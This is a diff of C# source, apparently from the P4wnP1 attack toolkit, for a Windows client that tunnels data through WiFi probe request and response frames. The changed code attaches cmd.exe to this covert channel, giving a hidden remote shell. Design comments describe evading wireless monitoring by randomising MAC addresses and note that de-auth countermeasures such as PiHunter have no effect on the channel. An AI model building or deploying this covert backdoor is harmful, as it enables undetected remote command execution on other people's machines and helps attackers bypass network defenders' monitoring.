@@ -63,6 +63,25 @@ using System.Threading;
  * 
  */
 
+/*
+* - only one channel per client
+* - client identified by SA (could change during scan, e.g. apple) --> Failover to payload based identifier needed
+* - MTU depends on usability of Vendor IE in each direction, which should be tested on connection init
+* - transfer rate client --> server depends on scan speed (new scan only if old one is finished)
+* ---> native wifi api doesn't allow scanning for multiple SSIDs at once, could be improved with new Win10 API
+* - packet transmission, transmit order and uniqeness aren't guarantied at low layer for now (UDP like)
+* - covert channel data is distinguished from noise with 16 bit checksums (one for SSID and one for Vendor IE)
+* - source MAC of server could vary (isn't used in covert channel data validation), this could be used to randomize
+* the server's source mac (=bssid and SA), e.g. to prevent alerts from monitoring systems which react on changing
+* SSIDs for the same BSSID
+* - it should be noted, that the covert channel isn't impacted by active counter meassures based on
+* on detection of multiple SSIDs for the same AP bssid (for instance PiHunter would start sending de-auths when
+* this kind of management frames is spotted). This wouldn't affect the covert channel, because it isn't based on
+* authentication or association, but on purew PROBE REQUEST/RESPONSE. Due to this fact, a de-auth would do nothing.
+* To be more precise, the P4wnP1 end would even ignore the de-auth, as it only reacts on probe requests.
+* 
+*/
+
 namespace NWiFi
 {
     public class LimitedQueue<T>:Queue<T>
@@ -178,28 +197,23 @@ namespace NWiFi
         public byte[] pay2 = null; //encoded in vendor IE (optional, only if possible)
         public byte seq = 0;
         public byte ack = 0;
-        //len_pay1/len_pay2 not needed, represented by pay1.Length/pay2.length, but has to be encoded in packet
-        //byte len_pay1 = 0; //netto length of payload 1
-        //byte len_pay2 = 0; //netto length of payload 2
-
-        //cheksums aren't stored, only calculated between checks
-        //byte chk_pay1 = 0; //8 bit checksum for pay1
-        //byte chk_pay2 = 0; //8 bit checksum for pay2
 
         public bool FlagControlMessage = false; //If set, the payload contains a control message, pay1[0] is control message type
         public byte ctlm_type = 0;
-
-        //not needed, vendor IE tx/rx capabilities are checked during connection initialization
-        //bool FlagCarriesPay2 = false; //if true, the packet gets/was transmitted with a vendor IE (pay2) included, which could maybe get lost
-        //bool FlagAckPay2 = false; //if true, the packet gets/was transmitted with a vendor IE (pay2) included, which could maybe get lost
 
         public const byte CTLM_TYPE_CON_INIT_REQ1 = 1;
         public const byte CTLM_TYPE_CON_INIT_RSP1 = 2;
         public const byte CTLM_TYPE_CON_INIT_REQ2 = 3;
         public const byte CTLM_TYPE_CON_INIT_RSP2 = 4;
         public const byte CTLM_TYPE_CON_RESET = 5;
-        public const byte CTLM_TYPE_CON_RESET_RESP = 6;
-
+        public const byte CTLM_TYPE_RESET_LISTENING_PROC = 6; // tells the Client to restart the process which is bound to the socket, ignored by server (misplaced application layer message)
+        public const byte CTLM_TYPE_CLEAR_QUEUES = 7; // tells the receiver to clear inbound and outbound queue of ClientSocket
+        public const byte CTLM_TYPE_KILL_CLIENT = 8; // tells the client to exit
+        public const byte CTLM_TYPE_SET_CLIENT_POLL_INTERVALL = 9; // currently unused
+        
+	    public const byte CON_RESET_REASON_UNSPECIFIED = 0;
+        public const byte CON_RESET_REASON_INVALID_CLIENT_ID = 1; 
+    
         public const byte PAY1_MAX_LEN = 28;
         public const byte PAY2_MAX_LEN = 236;
 
@@ -506,17 +520,19 @@ namespace NWiFi
             this.in_queue = new LimitedQueue<byte[]>(10);
         }
 
-        private void onDisconnect()
+        private void onDisconnect(int reason_code)
         {
-            Console.WriteLine("Connection reset from server");
+            Console.WriteLine(String.Format("Connection reset from server, reason code: {0}", reason_code));
             this.state = SocketState.CLOSE;
         }
 
-        public bool Connect(IntPtr nativeWiFiClientHandle, Guid if_guid, byte srvID = 8)
+        public bool Connect(IntPtr nativeWiFiClientHandle, Guid if_guid, byte srvID = 8, int maxAttempts = -1)
         {
             this.nwifi_client_handle = nativeWiFiClientHandle;
             this.if_guid = if_guid;
             this.srvID = srvID;
+
+            int attempts_without_success = 0;
 
 #if DEBUG
             Console.WriteLine(String.Format("Connect Init Request 1 (to srvID {0})...", this.srvID));
@@ -547,12 +563,19 @@ namespace NWiFi
 
             while (!stage1finished)
             {
+                attempts_without_success++;
                 Packet2[] recv = NativeWifi.SendRecv(nativeWiFiClientHandle, if_guid, initReq1, true); //The last boolean parameter forces the scan to finish, before the method returns
                 if (recv != null)
                 {
-                    foreach (Packet2 initResp1 in recv)
+                    //Atheros fix: the list of "seen probe responses" is filled until a sequence number doubles (driver doesn't
+                    //flush SSID list between scans). Luckily, the results are delivered in order, which means the latest probe response received
+                    //is the last entry in the BSSList. To account for this, we iterate over the BSSEntryList in reverse order and abort as soon as the
+                    //outbound packet for the next scan has to be changed (tx_packe_dirty)
+
+                    //foreach (Packet2 initResp1 in recv)
+                    for (int j = (recv.Length - 1); j >= 0; j--)
                     {
-                        
+                        Packet2 initResp1 = recv[j];
 
                         if (initResp1.ctlm_type != Packet2.CTLM_TYPE_CON_INIT_RSP1) continue; //next packet
                         if (initResp1.ack != 1) continue; //next packet
@@ -596,6 +619,10 @@ namespace NWiFi
 #if DEBUG
                 else Console.WriteLine("Nothing received");
 #endif
+                if (maxAttempts > 0)
+                {
+                    if (attempts_without_success >= maxAttempts && !stage1finished) return false;
+                }
             }
 #if DEBUG
             Console.WriteLine("Connect Init Request 2 ...");
@@ -621,14 +648,26 @@ namespace NWiFi
             initReq2.seq = 2;
             initReq2.ack = 1;
 
+            //reset counter for failed attempts
+            attempts_without_success = 0;
+
             bool stage2finished = false;
             while (!stage2finished) //ToDo: ...and no connection reset received
             {
+                attempts_without_success++;
                 Packet2[] recv = NativeWifi.SendRecv(nativeWiFiClientHandle, if_guid, initReq2, true); //The last boolean parameter forces the scan to finish, before the method returns
                 if (recv != null)
                 {
-                    foreach (Packet2 initResp2 in recv)
+                    //Atheros fix: the list of "seen probe responses" is filled until a sequence number doubles (driver doesn't
+                    //flush SSID list between scans). Luckily, the results are delivered in order, which means the latest probe response received
+                    //is the last entry in the BSSList. To account for this, we iterate over the BSSEntryList in reverse order and abort as soon as the
+                    //outbound packet for the next scan has to be changed (tx_packe_dirty)
+
+                    //foreach (Packet2 initResp2 in recv)
+                    for (int j = (recv.Length - 1); j >= 0; j--)
                     {
+                        Packet2 initResp2 = recv[j];
+
                         if (!initResp2.FlagControlMessage) continue; //next packet
                         if (initResp2.ctlm_type != Packet2.CTLM_TYPE_CON_INIT_RSP2) continue;
                         if (initResp2.srvID != this.srvID) continue; //received from wrong server
@@ -652,6 +691,10 @@ namespace NWiFi
 #if DEBUG
                 else Console.WriteLine("Nothing received\n");
 #endif
+                if (maxAttempts > 0)
+                {
+                    if (attempts_without_success >= maxAttempts && !stage2finished) return false;
+                }
             }
 
 
@@ -702,6 +745,8 @@ namespace NWiFi
 
             bool indata_in_last_run = false;
 
+            bool tx_packet_dirty = false;
+
             while (this.state == SocketState.STATE_OPEN)
             {
                 Console.WriteLine("=========== SCAN ====================");
@@ -711,10 +756,31 @@ namespace NWiFi
                     Console.WriteLine("=========== SCAN END ====================");
                     continue;
                 }
-                foreach (Packet2 resp in resps)
+
+                tx_packet_dirty = false;
+
+
+                //Atheros fix: the list of "seen probe responses" is filled until a sequence number doubles (driver doesn't
+                //flush SSID list between scans). Luckily, the results are delivered in order, which means the latest probe response received
+                //is the last entry in the BSSList. To account for this, we iterate over the BSSEntryList in reverse order and abort as soon as the
+                //outbound packet for the next scan has to be changed (tx_packe_dirty)
+
+                //foreach (Packet2 resp in resps) //disabled forward iteration
+                for (int i = (resps.Length-1); i>=0; i--)
                 {
+                    Packet2 resp = resps[i];
+
+                    if (tx_packet_dirty)
+                    {
+                        Console.WriteLine("Discarding rest of inbound data, as updated TX packet has to be sent first...");
+                        break;
+                    }
+
                     if (this.clientID != resp.clientID)
                     {
+                        //Fix: if last outbound packet was CTLM_TYPE_CON_INIT_RSP2 and the server didn't receive it,
+                        // we have to resend it,
+
                         Console.WriteLine("Ignoring packet for other Client");
                         continue;
                     }
@@ -726,17 +792,16 @@ namespace NWiFi
                     {
                         Console.WriteLine("****** New OUTDATA ********");
                         new_out = true;
-
-
-
+                        //tx_packet_dirty = true;
                     }
 
-                    byte last_resp_seq = req.ack;
+                    
                     byte next_resp_seq = (byte)((req.ack + 1) & 0xF);
                     if (resp.seq == next_resp_seq)
                     {
                         Console.WriteLine("*****New INDATA*****");
                         new_in = true;
+                        //tx_packet_dirty = true;
                     }
                     //two else cases a) out-of-order seq b) repeated seq --> in both cases we resend the last ack (nothing to do)
 
@@ -768,7 +833,14 @@ namespace NWiFi
                         if (resp.FlagControlMessage)
                         {
                             //CTLM
-                            if (resp.ctlm_type == Packet2.CTLM_TYPE_CON_RESET) this.onDisconnect();
+                            if (resp.ctlm_type == Packet2.CTLM_TYPE_CON_RESET)
+                            {
+                                int reset_reason = Packet2.CON_RESET_REASON_UNSPECIFIED;
+                                //extract reason if present
+                                if (resp.pay1.Length > 1) reset_reason = resp.pay1[1];
+
+                                this.onDisconnect(reset_reason);
+                            }
                             //don't advance ack for next request
                         }
 
@@ -776,11 +848,9 @@ namespace NWiFi
                         {
                             if (this.in_queue.Count < this.in_queue.Limit)
                             {
-
-
-
                                 // Queue could take data, so we could acknowledge reception to server
                                 req.ack = resp.seq;
+                                tx_packet_dirty = true;
 
                                 //reconstruct payload
                                 int indata_len = resp.pay1.Length;
@@ -821,6 +891,7 @@ namespace NWiFi
                         {
                             req.seq += 1;
                             req.seq &= 0xF;
+                            tx_packet_dirty = true;
 
                             //If outbound data is present in the queue, we send it
                             //IF NOT; AN EMPTY PAYLOAD IS SEND TO KEEP COMMUNICATION GOING (like a heartbeat) AS WE HAVE
@@ -941,7 +1012,7 @@ namespace NWiFi
             }
 
 #if DEBUG
-            Console.WriteLine(String.Format("Out queue elements: {0}", this.out_queue.Count));
+           // Console.WriteLine(String.Format("Out queue elements: {0}", this.out_queue.Count));
 #endif
 
         }
@@ -1337,10 +1408,12 @@ namespace NWiFi
                 //extract vendor IE (type = 221) if present
                 in_ie_vendor = extractIe(221, pIeData, bssEntries[i].ieSize);
 
+                Console.WriteLine(String.Format("SSID recieved: {0}", Helper.bytes2hexStr(in_ssid)));
                 if (!Packet2.checkLengthChecksum(in_ssid, in_ie_vendor))
                 {
                     //Console.WriteLine(String.Format("Packet dropped in filter, BSSID {0} SSID {1}", ethaddr2str(in_sa), System.Text.Encoding.ASCII.GetString(in_ssid)));
                     bssListPtr += Marshal.SizeOf(typeof(WlanBssEntry)); //advance bssListPtr by sizeof(WlanBssEntry) struct
+                    Console.WriteLine(String.Format("Discarded SSID: {0}", Helper.bytes2hexStr(in_ssid)));
                     continue; //skip invalid packets
                 }
 
@@ -1432,13 +1505,13 @@ namespace NWiFi
                     break;
 #if DEBUG
                 case WlanNotificationCodeAcm.NetworkAvailable:
-                    //Console.WriteLine("Network Available!");
+                    Console.WriteLine("Network Available!");
                     break;
                 case WlanNotificationCodeAcm.NetworkNotAvailable:
-                    //Console.WriteLine("Network NOT Available!");
+                    Console.WriteLine("Network NOT Available!");
                     break;
                 case WlanNotificationCodeAcm.ProfilesExhausted:
-                    //Console.WriteLine("Profiles exhausted!");
+                    Console.WriteLine("Profiles exhausted!");
                     break;
 #endif
             }
@@ -1458,7 +1531,11 @@ namespace NWiFi
             {
                 this.csock = socket;
                 this.command = command;
-                sock_in_buf = new byte[csock.MTU];
+
+                int in_buf_size = Packet2.PAY1_MAX_LEN;
+                if (csock.rxVenIeWorking) in_buf_size += Packet2.PAY2_MAX_LEN; //larger inbuffer if we are able to receive ven IE
+                sock_in_buf = new byte[in_buf_size];
+                
             }
 
             private void out_handler(object proc, DataReceivedEventArgs data_args)
@@ -1521,17 +1598,19 @@ namespace NWiFi
         static extern bool AllocConsole();
 #endif
 
-        public static String run()
+        public static void run()
         {
 #if DEBUG
             AllocConsole();
 
             Console.WriteLine("Starting test");
 #endif
-            String res = "";
-
             IntPtr handle = openNativeWifiHandle();
-            if (handle == IntPtr.Zero) return "No valid handle for native WiFi API received";
+            if (handle == IntPtr.Zero)
+            {
+                Console.WriteLine("No valid handle for native WiFi API received");
+                return;
+            }
 
             try
             {
@@ -1540,65 +1619,48 @@ namespace NWiFi
             }
             catch
             {
-                return "Error registering for Notifications";
-                throw;
+                Console.WriteLine("Error registering for Notifications");
+                closeNativeWifiHandle(handle);
+                return;
             }
 
 
             //Enumerate interfaces
-            WlanInterfaceInfo[] ifi = enumInterfaces(handle);
-            
-            //Go on if there's at least one WiFi interface
-            if (ifi.Length > 0)
+            WlanInterfaceInfo[] ifis = enumInterfaces(handle);
+
+            //Try every available interface
+            foreach (WlanInterfaceInfo ifi in ifis)
+            //WlanInterfaceInfo ifi = ifis[1];
             {
                 //ToDo: Ignore stale interfaces
 
                 //use first available interface
-                Guid g_if = ifi[0].interfaceGuid;
+                Guid g_if = ifi.interfaceGuid;
+                Console.WriteLine(String.Format("Trying to connect covert channel via '{0}'", ifi.interfaceDescription));
 
                 ClientSocket wsock = new ClientSocket();
-                bool conres = wsock.Connect(handle, g_if, 9);
+                int max_connection_attempts = -1;
+                bool conres = wsock.Connect(handle, g_if, 9, max_connection_attempts);
 
-                if (conres) Console.WriteLine(String.Format("Connection established\nMTU: {0}\nClientID: {1}", wsock.MTU, wsock.clientID));
-
-                Console.WriteLine("Read key in test function, to avoid exitting and closing WiFi handle");
-
-
-                ClientSubProc cp = new ClientSubProc(wsock, "cmd.exe");
-                cp.attachSubProcToSocket();
+                if (conres)
+                {
+                    Console.WriteLine(String.Format("Connection established\nMTU: {0}\nClientID: {1}", wsock.MTU, wsock.clientID));
+                    ClientSubProc cp = new ClientSubProc(wsock, "cmd.exe");
+                    cp.attachSubProcToSocket();
+                }
+                else
+                {
+                    Console.WriteLine(String.Format("No success after {0} connection attempts", max_connection_attempts));
+                }
 
                
-
                 //Avoid exitting lib
                 //Console.Read();
                 
-
-                
-
-                /*
-                 * - only one channel per client
-                 * - client identified by SA (could change during scan, e.g. apple) --> Failover to payload based identifier needed
-                 * - MTU depends on usability of Vendor IE in each direction, which should be tested on connection init
-                 * - transfer rate client --> server depends on scan speed (new scan only if old one is finished)
-                 * ---> native wifi api doesn't allow scanning for multiple SSIDs at once, could be improved with new Win10 API
-                 * - packet transmission, transmit order and uniqeness aren't guarantied at low layer for now (UDP like)
-                 * - covert channel data is distinguished from noise with 16 bit checksums (one for SSID and one for Vendor IE)
-                 * - source MAC of server could vary (isn't used in covert channel data validation), this could be used to randomize
-                 * the server's source mac (=bssid and SA), e.g. to prevent alerts from monitoring systems which react on changing
-                 * SSIDs for the same BSSID
-                 * - it should be noted, that the covert channel isn't impacted by active counter meassures based on
-                 * on detection of multiple SSIDs for the same AP bssid (for instance PiHunter would start sending de-auths when
-                 * this kind of management frames is spotted). This wouldn't affect the covert channel, because it isn't based on
-                 * authentication or association, but on purew PROBE REQUEST/RESPONSE. Due to this fact, a de-auth would do nothing.
-                 * To be more precise, the P4wnP1 end would even ignore the de-auth, as it only reacts on probe requests.
-                 * 
-                 */
-
             }
 
+            Console.WriteLine("Closing handle to native WiFi API");
             closeNativeWifiHandle(handle);
-
-            return res;
         }
         
     }
